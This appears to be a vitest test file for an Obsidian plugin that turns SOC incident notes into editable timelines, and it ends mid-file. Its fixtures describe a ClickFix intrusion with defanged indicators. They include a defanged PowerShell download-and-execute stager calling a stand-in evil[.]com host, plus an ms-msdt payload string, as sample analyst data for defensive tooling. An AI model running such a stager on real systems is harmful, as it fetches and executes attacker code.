import type { Editor, EditorPosition, EditorTransaction } from 'obsidian'
import { describe, expect, it } from 'vitest'
import {
  type TimelineEdit,
  addChild,
  addEventAtEnd,
  addEventBelow,
  applyEdit,
  backToPlainList,
  copyText,
  defangTimeline,
  deleteEvent,
  insertTimeline,
  makeTimeline,
  moveEvent,
  selectedLines,
  setEventKind,
  setStyle,
  sortEventsByTime
} from './actions'
import { defangText } from '../soc/toolbox'
import { TIMELINE_MARKER, copyForTicket, findTimelines, markerFor } from './parse'

/** The ClickFix sample from the design spec, as it sits in a case note. */
const CLICKFIX = [
  '## Findings:',
  '%% timeline %%',
  '- On 3 May 2025, 11:04 the user was observed using Microsoft Edge …',
  '- At 11:05:40, the user was observed visiting hxxps://eemmbryequo[.]shop/ (…).',
  '    - Following the navigation, the webpage hosted a script …',
  '- At 11:06:12, Execution: the user opened Run (Win+R) and pasted `powershell …` (T1204.004)',
  '- At 11:06:15, Download: the payload was fetched from promptcraft[.]online.',
  '    - Source: EDR process tree',
  '- At 11:31, Detection: XDR raised "Suspicious PowerShell download cradle" on corp-wks-102.',
  '- Response: the SOC isolated corp-wks-102 from the network.'
]

/** The note after an edit, as a list of lines. */
function apply(lines: string[], edit: TimelineEdit | null): string[] {
  if (!edit) throw new Error('no edit')
  return [...lines.slice(0, edit.fromLine), ...edit.text.split('\n'), ...lines.slice(edit.toLine + 1)]
}

/** The text of every event in the note's first timeline. */
function texts(lines: string[]): string[] {
  return findTimelines(lines)[0].events.map((e) => e.text)
}

describe('makeTimeline', () => {
  it('puts the marker above the list the caret is in', () => {
    const note = ['## Findings:', '- one', '- two', '    - detail', '- three', '', 'After.']
    for (const caret of [1, 2, 3, 4]) {
      const out = apply(note, makeTimeline(note, caret, caret))
      expect(out).toEqual(['## Findings:', TIMELINE_MARKER, ...note.slice(1)])
    }
  })

  it('finds the first line across a single blank line and continuation lines', () => {
    const note = ['Intro.', '', '- one', '  continued', '', '- two']
    const out = apply(note, makeTimeline(note, 5, 5))
    expect(out).toEqual(['Intro.', '', TIMELINE_MARKER, '- one', '  continued', '', '- two'])
    expect(texts(out)).toEqual(['one', 'two'])
  })

  it('stops at two blank lines, as the timeline itself would', () => {
    const note = ['- one', '', '', '- two']
    expect(apply(note, makeTimeline(note, 3, 3))).toEqual(['- one', '', '', TIMELINE_MARKER, '- two'])
  })

  it('indents the marker like the list', () => {
    const note = ['Steps:', '  * one', '  * two']
    const out = apply(note, makeTimeline(note, 2, 2))
    expect(out[1]).toBe(`  ${TIMELINE_MARKER}`)
    expect(texts(out)).toEqual(['one', 'two'])
  })

  it('is one replacement that only adds the marker line when the caret is in a list', () => {
    const note = ['- one', '- two']
    expect(makeTimeline(note, 1, 1)).toEqual({ fromLine: 0, toLine: 1, text: `${TIMELINE_MARKER}\n- one\n- two` })
  })

  it('offers nothing outside a list', () => {
    const note = ['A paragraph.', '', '- one', '    code under a paragraph?']
    expect(makeTimeline(note, 0, 0)).toBeNull()
    expect(makeTimeline(note, 1, 1)).toBeNull()
    expect(makeTimeline(['Para', '    indented', '- x'], 1, 1)).toBeNull()
    expect(makeTimeline(['## Heading'], 0, 0)).toBeNull()
    expect(makeTimeline([''], 0, 0)).toBeNull()
  })

  it('offers nothing in a timeline already', () => {
    for (let line = 1; line < CLICKFIX.length; line++) expect(makeTimeline(CLICKFIX, line, line)).toBeNull()
    expect(makeTimeline(CLICKFIX, 0, 4)).toBeNull()
  })

  it('offers nothing in a code block, where the marker would be an example', () => {
    const note = ['```', '- one', '- two', '```']
    expect(makeTimeline(note, 1, 1)).toBeNull()
  })

  it('makes selected plain lines into events, blank lines and headings left alone', () => {
    const note = ['## Findings:', '11:04 the user opened Edge', '', '11:05 visited a page', '- 11:06 ran a command', '']
    const out = apply(note, makeTimeline(note, 0, 5))
    expect(out).toEqual([
      '## Findings:',
      TIMELINE_MARKER,
      '- 11:04 the user opened Edge',
      '',
      '- 11:05 visited a page',
      '- 11:06 ran a command',
      ''
    ])
    expect(findTimelines(out)[0].events).toHaveLength(3)
  })

  it('keeps an indented line under an event as its detail, and the indent of a prefixed line', () => {
    const note = ['  first', '      more about it', '  second']
    const out = apply(note, makeTimeline(note, 0, 2))
    expect(out).toEqual([`  ${TIMELINE_MARKER}`, '  - first', '      more about it', '  - second'])
    expect(findTimelines(out)[0].events[0].details.map((d) => d.text)).toEqual(['more about it'])
  })

  it('keeps a selected indented line as the detail of the event above the selection', () => {
    const note = ['- one', '    continued', 'two']
    expect(apply(note, makeTimeline(note, 1, 2))).toEqual([TIMELINE_MARKER, '- one', '    continued', '- two'])
  })

  it('takes in the list just above a selection of plain lines', () => {
    const note = ['- one', 'two', 'three']
    const out = apply(note, makeTimeline(note, 1, 2))
    expect(out).toEqual([TIMELINE_MARKER, '- one', '- two', '- three'])
  })

  it('makes nothing when the selection would not become one timeline', () => {
    expect(makeTimeline(['one', '## Next', 'two'], 0, 2)).toBeNull()
    expect(makeTimeline(['one', '', '', 'two'], 0, 3)).toBeNull()
    // Less indented than the first line, so not part of its list.
    expect(makeTimeline(['    first', 'second'], 0, 1)).toBeNull()
  })

  it('makes nothing over a selection with a code block, a numbered list or a divider in it', () => {
    const code = ['## Findings:', '- At 11:05 ran:', '```', 'powershell -enc AAA', '```', '- At 11:06 next']
    expect(makeTimeline(code, 0, 5)).toBeNull()
    expect(makeTimeline(['- a', '~~~', 'b', '~~~'], 0, 3)).toBeNull()
    expect(makeTimeline(['1. At 11:04 a', '2. At 11:05 b'], 0, 1)).toBeNull()
    expect(makeTimeline(['11:04 a', '3) b'], 0, 1)).toBeNull()
    for (const divider of ['---', '***', '- - -', ' _ _ _']) {
      expect(makeTimeline(['11:04 a', divider, '11:05 b'], 0, 2)).toBeNull()
    }
  })

  it("keeps a code block that is an event's detail when making a timeline over a list", () => {
    const note = ['- At 11:05 ran:', '  ```', '  # stage 1', '', '', '  ```', '- At 11:06 next']
    expect(apply(note, makeTimeline(note, 0, 6))).toEqual([TIMELINE_MARKER, ...note])
    expect(apply(note, makeTimeline(note, 6, 6))).toEqual([TIMELINE_MARKER, ...note])
    // The fence opened on the bullet itself.
    const own = ['- ```sh', '  # stage 1', '', '', '  ```', '- At 11:06 next']
    expect(apply(own, makeTimeline(own, 5, 5))).toEqual([TIMELINE_MARKER, ...own])
  })

  it('makes nothing in YAML frontmatter', () => {
    const note = ['---', 'tags:', '  - malware', 'assignees:', '  - Farhan', '---', '- a', '- b']
    for (const line of [0, 1, 2, 4, 5]) expect(makeTimeline(note, line, line)).toBeNull()
    expect(makeTimeline(note, 4, 7)).toBeNull()
    expect(apply(note, makeTimeline(note, 6, 6))).toEqual([...note.slice(0, 6), TIMELINE_MARKER, '- a', '- b'])
  })
})

describe('selectedLines', () => {
  const editor = (from: EditorPosition, to: EditorPosition) =>
    ({ getCursor: (which: string) => (which === 'from' ? from : to) }) as unknown as Editor

  it('leaves out the line a selection ends at column 0 of (a triple-click, Shift+Down)', () => {
    expect(selectedLines(editor({ line: 1, ch: 0 }, { line: 3, ch: 0 }))).toEqual([1, 2])
    expect(selectedLines(editor({ line: 1, ch: 2 }, { line: 3, ch: 1 }))).toEqual([1, 3])
    expect(selectedLines(editor({ line: 2, ch: 0 }, { line: 2, ch: 0 }))).toEqual([2, 2])
    const note = ['## F', '11:04 a', '11:05 b', 'Summary para']
    const [from, to] = selectedLines(editor({ line: 1, ch: 0 }, { line: 3, ch: 0 }))
    expect(apply(note, makeTimeline(note, from, to))).toEqual([
      '## F',
      TIMELINE_MARKER,
      '- 11:04 a',
      '- 11:05 b',
      'Summary para'
    ])
  })
})

describe('addEventBelow and addEventAtEnd', () => {
  it('adds an empty event after the event and its details, caret in it', () => {
    const edit = addEventBelow(CLICKFIX, 3)
    expect(edit).toEqual({ fromLine: 4, toLine: 4, text: `${CLICKFIX[4]}\n- `, cursor: { line: 5, ch: 2 } })
    const out = apply(CLICKFIX, edit)
    expect(out[5]).toBe('- ')
    expect(findTimelines(out)[0].events).toHaveLength(7)
    // From a detail line, the same place.
    expect(addEventBelow(CLICKFIX, 4)).toEqual(edit)
  })

  it('adds the first event when the caret is on the marker', () => {
    const out = apply(CLICKFIX, addEventBelow(CLICKFIX, 1))
    expect(out.slice(1, 4)).toEqual([TIMELINE_MARKER, '- ', CLICKFIX[2]])
  })

  it('keeps the bullet and indent of the list', () => {
    const note = [TIMELINE_MARKER, '  * one', '      * detail', '  * two']
    expect(apply(note, addEventBelow(note, 1))).toEqual([
      TIMELINE_MARKER,
      '  * one',
      '      * detail',
      '  * ',
      '  * two'
    ])
    expect(addEventBelow(note, 1)?.cursor).toEqual({ line: 3, ch: 4 })
  })

  it('adds the end event after the last detail line', () => {
    const note = [...CLICKFIX.slice(0, 8), 'After.']
    const edit = addEventAtEnd(note, 1)
    expect(apply(note, edit)).toEqual([...CLICKFIX.slice(0, 8), '- ', 'After.'])
    expect(edit?.cursor).toEqual({ line: 8, ch: 2 })
  })

  it('adds an event to an empty timeline', () => {
    expect(apply([TIMELINE_MARKER], addEventAtEnd([TIMELINE_MARKER], 0))).toEqual([TIMELINE_MARKER, '- '])
    expect(apply(['x', TIMELINE_MARKER, 'y'], addEventBelow(['x', TIMELINE_MARKER, 'y'], 1))).toEqual([
      'x',
      TIMELINE_MARKER,
      '- ',
      'y'
    ])
  })

  it('offers nothing outside a timeline', () => {
    expect(addEventBelow(CLICKFIX, 0)).toBeNull()
    expect(addEventAtEnd(CLICKFIX, 0)).toBeNull()
    expect(addEventBelow(['- one'], 0)).toBeNull()
  })

  it('adds after a code block in the last event, never inside it', () => {
    const note = [
      TIMELINE_MARKER,
      '- At 11:06, Execution: ran the stager',
      '  ```powershell',
      '  # stage 1',
      '  iex (iwr hxxp://evil[.]com/a.ps1)',
      '  ```'
    ]
    expect(apply(note, addEventAtEnd(note, 0))).toEqual([...note, '- '])
    expect(apply(note, addEventBelow(note, 3))).toEqual([...note, '- '])
  })
})

describe('moveEvent', () => {
  it('swaps an event and its details with the one below, caret following', () => {
    const edit = moveEvent(CLICKFIX, 3, 'down')
    const out = apply(CLICKFIX, edit)
    expect(out.slice(3, 6)).toEqual([CLICKFIX[5], CLICKFIX[3], CLICKFIX[4]])
    expect(edit?.cursor).toEqual({ line: 4, ch: CLICKFIX[3].length })
    // Caret on the detail line moves with it.
    expect(moveEvent(CLICKFIX, 4, 'down')?.cursor).toEqual({ line: 5, ch: CLICKFIX[4].length })
  })

  it('moves an event with details up', () => {
    const out = apply(CLICKFIX, moveEvent(CLICKFIX, 6, 'up'))
    expect(out.slice(5, 8)).toEqual([CLICKFIX[6], CLICKFIX[7], CLICKFIX[5]])
    expect(moveEvent(CLICKFIX, 7, 'up')?.cursor).toEqual({ line: 6, ch: CLICKFIX[7].length })
    const note = [TIMELINE_MARKER, '- a', '  - a1', '- b', '  - b1', '  - b2']
    expect(apply(note, moveEvent(note, 4, 'up'))).toEqual([TIMELINE_MARKER, '- b', '  - b1', '  - b2', '- a', '  - a1'])
    expect(moveEvent(note, 4, 'up')?.cursor).toEqual({ line: 2, ch: 6 })
  })

  it('moves the last event up and the first down', () => {
    const last = apply(CLICKFIX, moveEvent(CLICKFIX, 9, 'up'))
    expect(last.slice(8)).toEqual([CLICKFIX[9], CLICKFIX[8]])
    const first = apply(CLICKFIX, moveEvent(CLICKFIX, 2, 'down'))
    expect(first.slice(2, 5)).toEqual([CLICKFIX[3], CLICKFIX[4], CLICKFIX[2]])
    expect(texts(first)).toHaveLength(6)
  })

  it('offers nothing past either end, on the marker or outside', () => {
    expect(moveEvent(CLICKFIX, 2, 'up')).toBeNull()
    expect(moveEvent(CLICKFIX, 9, 'down')).toBeNull()
    expect(moveEvent(CLICKFIX, 1, 'down')).toBeNull()
    expect(moveEvent(CLICKFIX, 0, 'down')).toBeNull()
  })

  it('leaves blank lines between events where they are', () => {
    const note = [TIMELINE_MARKER, '- one', '', '- two', '    - detail']
    expect(apply(note, moveEvent(note, 3, 'up'))).toEqual([TIMELINE_MARKER, '- two', '    - detail', '', '- one'])
    // A caret on the blank line belongs to the event above and lands on its last line.
    expect(moveEvent(note, 2, 'down')?.cursor).toEqual({ line: 4, ch: 5 })
  })

  it('moves events of an indented list', () => {
    const note = [TIMELINE_MARKER, '  - one', '  - two']
    expect(apply(note, moveEvent(note, 1, 'down'))).toEqual([TIMELINE_MARKER, '  - two', '  - one'])
  })
})

describe('setEventKind', () => {
  const kindOf = (lines: string[], line: number) => {
    const e = findTimelines(lines)[0].events.find((x) => x.line === line)
    return e && { kind: e.kind, explicit: e.kindExplicit }
  }

  it('writes the kind word after the time phrase and its comma', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 3, 'web'))
    expect(out[3]).toBe('- At 11:05:40, Web: the user was observed visiting hxxps://eemmbryequo[.]shop/ (…).')
    expect(kindOf(out, 3)).toEqual({ kind: 'web', explicit: true })
    expect(out.filter((_, i) => i !== 3)).toEqual(CLICKFIX.filter((_, i) => i !== 3))
  })

  it('replaces a kind word that is there', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 5, 'file'))
    expect(out[5]).toBe('- At 11:06:12, File: the user opened Run (Win+R) and pasted `powershell …` (T1204.004)')
    expect(kindOf(out, 5)).toEqual({ kind: 'file', explicit: true })
  })

  it("keeps the analyst's word when it already means that kind", () => {
    expect(setEventKind(CLICKFIX, 6, 'file')).toBeNull()
    expect(setEventKind(CLICKFIX, 8, 'detection')).toBeNull()
    expect(setEventKind([TIMELINE_MARKER, '- At 11:00, Alert: x'], 1, 'detection')).toBeNull()
  })

  it('removes the kind word for Auto, leaving the kind to the text', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 5, 'auto'))
    expect(out[5]).toBe('- At 11:06:12, the user opened Run (Win+R) and pasted `powershell …` (T1204.004)')
    expect(kindOf(out, 5)).toEqual({ kind: 'execution', explicit: false })
    const untimed = apply(CLICKFIX, setEventKind(CLICKFIX, 9, 'auto'))
    expect(untimed[9]).toBe('- the SOC isolated corp-wks-102 from the network.')
    expect(setEventKind(CLICKFIX, 2, 'auto')).toBeNull()
  })

  it('writes the kind at the start of an untimed event', () => {
    const out = apply(CLICKFIX, setEventKind(CLICKFIX, 9, 'detection'))
    expect(out[9]).toBe('- Detection: the SOC isolated corp-wks-102 from the network.')
    const note = [TIMELINE_MARKER, '  - the user replied']
    expect(apply(note, setEventKind(note, 1, 'email'))[1]).toBe('  - Email: the user replied')
  })

  it('follows a time phrase that ends in a space, a dash or nothing', () => {
    expect(apply(CLICKFIX, setEventKind(CLICKFIX, 2, 'execution'))[2]).toBe(
      '- On 3 May 2025, 11:04 Execution: the user was observed using Microsoft Edge …'
    )
    const dash = [TIMELINE_MARKER, '- 11:04 – the user', '- At 11:05', '- At 11:06,', '- 11:07:']
    const out = apply(dash, setEventKind(dash, 1, 'response'))
    expect(out[1]).toBe('- 11:04 – Response: the user')
    expect(apply(dash, setEventKind(dash, 2, 'response'))[2]).toBe('- At 11:05 Response: ')
    expect(apply(dash, setEventKind(dash, 3, 'response'))[3]).toBe('- At 11:06, Response: ')
    for (const line of [2, 3]) {
      expect(kindOf(apply(dash, setEventKind(dash, line, 'response')), line)?.explicit).toBe(true)
    }
  })

  it('keeps a key event key', () => {
    const note = [TIMELINE_MARKER, '- At 11:04, **Initial access** via the page']
    const out = apply(note, setEventKind(note, 1, 'web'))
    expect(out[1]).toBe('- At 11:04, Web: **Initial access** via the page')
    expect(findTimelines(out)[0].events[0].key).toBe(true)
  })

  it('offers nothing on the marker, outside, or for observed, which has no word', () => {
    expect(setEventKind(CLICKFIX, 1, 'web')).toBeNull()
    expect(setEventKind(CLICKFIX, 0, 'web')).toBeNull()
    expect(setEventKind(CLICKFIX, 3, 'observed')).toBeNull()
  })

  it('keeps a bare bullet a bullet', () => {
    const note = [TIMELINE_MARKER, '- At 11:05 a', '-', '- At 11:06 b']
    const out = apply(note, setEventKind(note, 2, 'detection'))
    expect(out[2]).toBe('- Detection: ')
    expect(texts(out)).toEqual(['At 11:05 a', 'Detection: ', 'At 11:06 b'])
  })

  it('writes no kind in front of a code fence on the bullet, which would end the code and the timeline', () => {
    const note = [TIMELINE_MARKER, '- ```sh', '  # stage 1', '  ```', '- At 11:06 b']
    expect(setEventKind(note, 1, 'execution')).toBeNull()
  })

  it('writes the kind after a task box and its time, keeping the task', () => {
    const note = [TIMELINE_MARKER, '- [x] At 11:05, isolated host', '- [ ] 11:06 notify', '- [ ] call the vendor']
    expect(apply(note, setEventKind(note, 1, 'response'))[1]).toBe('- [x] At 11:05, Response: isolated host')
    expect(apply(note, setEventKind(note, 2, 'email'))[2]).toBe('- [ ] 11:06 Email: notify')
    expect(apply(note, setEventKind(note, 3, 'response'))[3]).toBe('- [ ] Response: call the vendor')
    const auto = [TIMELINE_MARKER, '- [x] At 11:05, Response: isolated host']
    expect(apply(auto, setEventKind(auto, 1, 'auto'))[1]).toBe('- [x] At 11:05, isolated host')
  })
})

describe('sortEventsByTime', () => {
  it('offers nothing when the events are in order, even with an untimed one', () => {
    expect(sortEventsByTime(CLICKFIX, 3)).toBeNull()
    expect(sortEventsByTime(CLICKFIX, 0)).toBeNull()
  })

  it('sorts, details travelling with their event and blank lines staying put', () => {
    const note = [TIMELINE_MARKER, '- 11:06 c', '    - detail of c', '', '- 11:04 a', '- 11:05 b', 'After.']
    const r = sortEventsByTime(note, 1)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(apply(note, r.edit)).toEqual([
      TIMELINE_MARKER,
      '- 11:04 a',
      '',
      '- 11:05 b',
      '- 11:06 c',
      '    - detail of c',
      'After.'
    ])
    // The caret stays with its event.
    expect(r.edit.cursor).toEqual({ line: 4, ch: note[1].length })
    const fromDetail = sortEventsByTime(note, 2)
    expect(fromDetail && 'edit' in fromDetail && fromDetail.edit.cursor).toEqual({ line: 5, ch: note[2].length })
  })

  it('orders by seconds only between times that both have them', () => {
    // 11:05 may be any second of that minute, so it keeps its place among the 11:05 events.
    const note = [TIMELINE_MARKER, '- 11:05:40 c', '- 11:05 a', '- 11:05 b', '- 11:05:10 b2', '- 11:04 first']
    const r = sortEventsByTime(note, 0)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(note, r.edit))).toEqual(['11:04 first', '11:05:10 b2', '11:05 a', '11:05 b', '11:05:40 c'])
    expect(sortEventsByTime([TIMELINE_MARKER, '- 11:05:40 c', '- 11:05 a'], 0)).toBeNull()
    const ms = [TIMELINE_MARKER, '- 11:05:40.500 b', '- 11:05:40.100 a']
    expect(sortEventsByTime(ms, 0)).toBeNull()
  })

  it('keeps equal times in note order', () => {
    const note = [TIMELINE_MARKER, '- 11:06 z', '- 11:05 b', '- 11:05 a']
    const r = sortEventsByTime(note, 0)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(note, r.edit))).toEqual(['11:05 b', '11:05 a', '11:06 z'])
  })

  it('sorts across stated dates', () => {
    const note = [TIMELINE_MARKER, '- 4 May 2025, 09:00 b', '- 3 May 2025, 23:00 a']
    const r = sortEventsByTime(note, 1)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(note, r.edit))).toEqual(['3 May 2025, 23:00 a', '4 May 2025, 09:00 b'])
  })

  it('refuses with a reason when an event has no time', () => {
    const note = [TIMELINE_MARKER, '- 11:06 c', '- the SOC responded', '- 11:04 a']
    expect(sortEventsByTime(note, 1)).toEqual({ reason: '1 event has no time' })
    expect(sortEventsByTime([...note, '- On 3 May 2025, a date only'], 1)).toEqual({ reason: '2 events have no time' })
  })

  it('refuses with a reason when the day order is unknown', () => {
    const note = [TIMELINE_MARKER, '- 11:06 c', '- 11:04 a', '- 3 May 2025, 09:00 b']
    expect(sortEventsByTime(note, 1)).toEqual({ reason: 'Not every event has a date, so the day order is unknown' })
  })

  it('refuses when sorting would move an event onto another day', () => {
    // 10:00 is on 3 May only because it follows the 3 May event.
    const note = [TIMELINE_MARKER, '- 3 May 2025, 11:00 a', '- 10:00 b']
    expect(sortEventsByTime(note, 1)).toEqual({
      reason: 'Sorting would move an event onto another day: write its date on it first'
    })
  })

  it('offers nothing outside a timeline', () => {
    expect(sortEventsByTime(['- 11:06 b', '- 11:04 a'], 0)).toBeNull()
  })

  it('refuses when sorting would take a time-only event away from the numeric date above it', () => {
    const note = [TIMELINE_MARKER, '- At 10/9/26, 2:29 AM email sent', '- At 2:20 AM user clicked']
    expect(sortEventsByTime(note, 1)).toEqual({
      reason: 'Sorting would move an event onto another day: write its date on it first'
    })
  })

  it('never sorts clocks written in different zones', () => {
    const zones = { reason: 'The times are written in different zones, so their order is unknown' }
    const note = [TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b', '- At 07:10 EDT, c']
    expect(sortEventsByTime(note, 1)).toEqual(zones)
    expect(sortEventsByTime([TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b', '- At 11:05, c'], 1)).toEqual(
      zones
    )
    // Unordered across zones is not known to be out of order, so nothing is offered.
    expect(sortEventsByTime([TIMELINE_MARKER, '- At 13:10 +02:00, b', '- At 11:04 UTC, a'], 1)).toBeNull()
    const same = [TIMELINE_MARKER, '- At 11:06 UTC, a', '- At 11:04 UTC, b']
    const r = sortEventsByTime(same, 1)
    if (!r || !('edit' in r)) throw new Error('expected an edit')
    expect(texts(apply(same, r.edit))).toEqual(['At 11:04 UTC, b', 'At 11:06 UTC, a'])
  })
})

describe('deleteEvent', () => {
  it('removes the event and its details whole, caret on the line above', () => {
    const edit = deleteEvent(CLICKFIX, 6)
    const out = apply(CLICKFIX, edit)
    expect(out).toEqual([...CLICKFIX.slice(0, 6), ...CLICKFIX.slice(8)])
    expect(edit?.cursor).toEqual({ line: 5, ch: CLICKFIX[5].length })
    expect(apply(CLICKFIX, deleteEvent(CLICKFIX, 7))).toEqual(out)
  })

  it('removes the first, the last and the only event', () => {
    expect(apply(CLICKFIX, deleteEvent(CLICKFIX, 2))).toEqual([...CLICKFIX.slice(0, 2), ...CLICKFIX.slice(3)])
    expect(apply(CLICKFIX, deleteEvent(CLICKFIX, 9))).toEqual(CLICKFIX.slice(0, 9))
    expect(apply([TIMELINE_MARKER, '- one'], deleteEvent([TIMELINE_MARKER, '- one'], 1))).toEqual([TIMELINE_MARKER])
  })

  it('offers nothing on the marker or outside', () => {
    expect(deleteEvent(CLICKFIX, 1)).toBeNull()
    expect(deleteEvent(CLICKFIX, 0)).toBeNull()
  })

  it('leaves one blank line between events in a loose list, so the timeline stays whole', () => {
    const note = [TIMELINE_MARKER, '- a', '', '- b', '', '- c']
    const out = apply(note, deleteEvent(note, 3))
    expect(out).toEqual([TIMELINE_MARKER, '- a', '', '- c'])
    expect(texts(out)).toEqual(['a', 'c'])
    const first = [TIMELINE_MARKER, '', '- a', '', '- b']
    expect(texts(apply(first, deleteEvent(first, 2)))).toEqual(['b'])
    const last = [TIMELINE_MARKER, '- a', '', '- b', '', 'After.']
    expect(apply(last, deleteEvent(last, 3))).toEqual([TIMELINE_MARKER, '- a', '', 'After.'])
  })

  it('removes the code block in an event with it', () => {
    const note = [
      TIMELINE_MARKER,
      '- At 11:06, Execution: ran the stager',
      '  ```powershell',
      '  # stage 1',
      '  iex (iwr hxxp://evil[.]com/a.ps1)',
      '  ```',
      '- At 11:07 next',
      '- At 11:05 earlier'
    ]
    expect(apply(note, deleteEvent(note, 1))).toEqual([TIMELINE_MARKER, '- At 11:07 next', '- At 11:05 earlier'])
    const tab = [TIMELINE_MARKER, '- At 11:06 ran:', '\t```', '\t$a = 1', '', '', '\t$b = 2', '\t```', '- At 11:05 x']
    expect(apply(tab, deleteEvent(tab, 1))).toEqual([TIMELINE_MARKER, '- At 11:05 x'])
  })

  it('takes the blank lines an unclosed fence holds with its event, so the rest stays in the timeline', () => {
    const note = [TIMELINE_MARKER, '- a', '  ```', '  x', '', '', '- b', '- c']
    expect(apply(note, deleteEvent(note, 1))).toEqual([TIMELINE_MARKER, '- b', '- c'])
    const loose = [TIMELINE_MARKER, '', '- a', '  ```', '  x', '', '', '- b']
    expect(texts(apply(loose, deleteEvent(loose, 2)))).toEqual(['b'])
    expect(texts(apply(note, moveEvent(note, 1, 'down')))).toEqual(['b', 'a', 'c'])
  })
})

describe('defangTimeline', () => {
  const live = [
    'Before https://evil.example/a',
    TIMELINE_MARKER,
    '- At 11:05:40, the user visited https://eemmbryequo.shop/ (…).',
    '    - Mail from bad@evil.example',
    '- At 11:06, ran 10.0.0.5',
    'After https://evil.example/b'
  ]

  it('defangs event and detail lines only, never the marker or the note around it', () => {
    const r = defangTimeline(live, 2)
    expect(r?.changed).toBe(true)
    const out = apply(live, r?.edit ?? null)
    expect(out).toEqual([
      live[0],
      TIMELINE_MARKER,
      '- At 11:05:40, the user visited hxxps://eemmbryequo[.]shop/ (…).',
      '    - Mail from bad[at]evil[.]example',
      '- At 11:06, ran 10[.]0[.]0[.]5',
      live[5]
    ])
    expect(findTimelines(out)[0].summary.live).toBe(0)
    expect(defangTimeline(live, 1)?.changed).toBe(true)
  })

  it('says when there was nothing to defang', () => {
    const r = defangTimeline(CLICKFIX, 1)
    expect(r?.changed).toBe(false)
    expect(apply(CLICKFIX, r?.edit ?? null)).toEqual(CLICKFIX)
    expect(defangTimeline([TIMELINE_MARKER], 0)?.changed).toBe(false)
    expect(apply([TIMELINE_MARKER], defangTimeline([TIMELINE_MARKER], 0)?.edit ?? null)).toEqual([TIMELINE_MARKER])
  })

  it('offers nothing outside a timeline', () => {
    expect(defangTimeline(live, 0)).toBeNull()
  })
})

describe('backToPlainList', () => {
  it('removes only the marker line', () => {
    const out = apply(CLICKFIX, backToPlainList(CLICKFIX, 5))
    expect(out).toEqual([CLICKFIX[0], ...CLICKFIX.slice(2)])
    expect(findTimelines(out)).toEqual([])
    expect(apply(CLICKFIX, backToPlainList(CLICKFIX, 1))).toEqual(out)
  })

  it('removes a marker on the first line or alone', () => {
    expect(apply([TIMELINE_MARKER, '- one'], backToPlainList([TIMELINE_MARKER, '- one'], 1))).toEqual(['- one'])
    expect(apply([TIMELINE_MARKER], backToPlainList([TIMELINE_MARKER], 0))).toEqual([''])
    const blank = ['x', TIMELINE_MARKER, '', '- one']
    expect(apply(blank, backToPlainList(blank, 3))).toEqual(['x', '', '- one'])
  })

  it('offers nothing outside a timeline', () => {
    expect(backToPlainList(CLICKFIX, 0)).toBeNull()
  })
})

describe('copyText', () => {
  it('is the ticket copy of the timeline the caret is in', () => {
    const block = findTimelines(CLICKFIX)[0]
    expect(copyText(CLICKFIX, 1)).toBe(copyForTicket(block))
    expect(copyText(CLICKFIX, 7)).toBe(copyForTicket(block))
    expect(copyText(CLICKFIX, 0)).toBeNull()
  })

  it('defangs what Defang timeline would, before a value moves into prose', () => {
    const note = [
      TIMELINE_MARKER,
      '- At 11:05, the user browsed.',
      '    - Source: evil.com',
      '- Download: promptcraft.online',
      '- evil.org'
    ]
    expect(copyText(note, 0)?.split('\n')).toEqual([
      'Timeline (3 events)',
      '11:05      the user browsed. Source: evil[.]com',
      '--:--      Download: promptcraft[.]online (time not recorded)',
      '--:--      evil[.]org (time not recorded)'
    ])
  })

  it('agrees with the live count and Defang timeline on what is live', () => {
    const notes = [
      [TIMELINE_MARKER, '- At 11:05, the user browsed.', '    - Source: evil.com'],
      [TIMELINE_MARKER, '- At 11:05, seen 1.2.3.4,evil.com'],
      [TIMELINE_MARKER, '- At 11:05, opened file://evil-share/x.hta'],
      [TIMELINE_MARKER, '- At 11:05, ran it', '    - Payload: ms-msdt:/id PCWDiagnostic'],
      [TIMELINE_MARKER, '- At 11:05, fetched from promptcraft.online.'],
      CLICKFIX
    ]
    for (const note of notes) {
      const line = findTimelines(note)[0].markerLine
      const live = findTimelines(note)[0].summary.live
      const r = defangTimeline(note, line)
      expect(r?.changed).toBe(live > 0)
      const after = apply(note, r?.edit ?? null)
      expect(findTimelines(after)[0].summary.live).toBe(0)
      // Nothing is left for a later defang to find, and the copy is the defanged note's copy.
      const copy = copyText(note, line) ?? ''
      expect(defangText(copy)).toBe(copy)
      expect(copy).toBe(copyText(after, line))
    }
  })
})

describe('edits', () => {
  it('never write a carriage return', () => {
    const edits = [
      makeTimeline(['a', 'b'], 0, 1),
      addEventBelow(CLICKFIX, 3),
      moveEvent(CLICKFIX, 3, 'down'),
      setEventKind(CLICKFIX, 3, 'web'),
      deleteEvent(CLICKFIX, 3),
      defangTimeline(CLICKFIX, 3)?.edit ?? null,
      backToPlainList(CLICKFIX, 3),
      insertTimeline(['Para.', 'Next.'], 0, 'steps'),
      setStyle(CLICKFIX, 3, 'chain'),
      addChild(CHAIN, 2)
    ]
    for (const edit of edits) expect(edit?.text).not.toMatch(/\r/)
  })
})

const STEPS = markerFor('steps')
const CHAINED = markerFor('chain')

/** A process chain with siblings, notes and a link with no children. */
const CHAIN = [
  CHAINED,
  '- explorer.exe',
  '  - cmd.exe /c a.bat',
  '    started from the Run box',
  '    - whoami',
  '  - powershell -enc AAA',
  '    - conhost.exe',
  '- services.exe'
]

describe('setEventKind: user and host', () => {
  it('writes User and Host, and keeps a word that already means them', () => {
    expect(apply(CLICKFIX, setEventKind(CLICKFIX, 3, 'user'))[3]).toBe(
      '- At 11:05:40, User: the user was observed visiting hxxps://eemmbryequo[.]shop/ (…).'
    )
    expect(apply(CLICKFIX, setEventKind(CLICKFIX, 9, 'host'))[9]).toBe(
      '- Host: the SOC isolated corp-wks-102 from the network.'
    )
    expect(setEventKind([TIMELINE_MARKER, '- At 11:00, Account: x'], 1, 'user')).toBeNull()
    expect(setEventKind([TIMELINE_MARKER, '- At 11:00, Workstation: x'], 1, 'host')).toBeNull()
  })
})

describe('insertTimeline', () => {
